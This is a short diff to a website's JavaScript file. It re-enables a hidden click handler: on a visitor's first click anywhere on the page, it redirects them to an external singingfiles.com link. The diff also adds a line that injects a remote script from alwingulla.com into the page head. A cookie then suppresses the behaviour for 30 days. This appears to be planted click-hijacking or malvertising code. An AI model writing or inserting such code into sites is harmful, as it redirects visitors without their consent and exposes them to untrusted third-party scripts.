@@ -121,15 +121,16 @@ seconds = (seconds < 10) ? "0" + seconds : seconds;
 return hours + ":" + minutes + ":" + seconds /*+ "." + milliseconds*/ ;
 }
   
-  /*
+  
   $("body").on("click", () => {
 
 if(getCookie("test") == null){
 window.location.href = "https://singingfiles.com/show.php?l=0&u=565295&id=58609";
 //call setCookie
+$('head').append('<script src="https://alwingulla.com/88/tag.min.js" data-zone="48566" async data-cfasync="false"></script>');
 setCookie("test", "es", 30);
 }
-  });*/
+  });
   
 
 
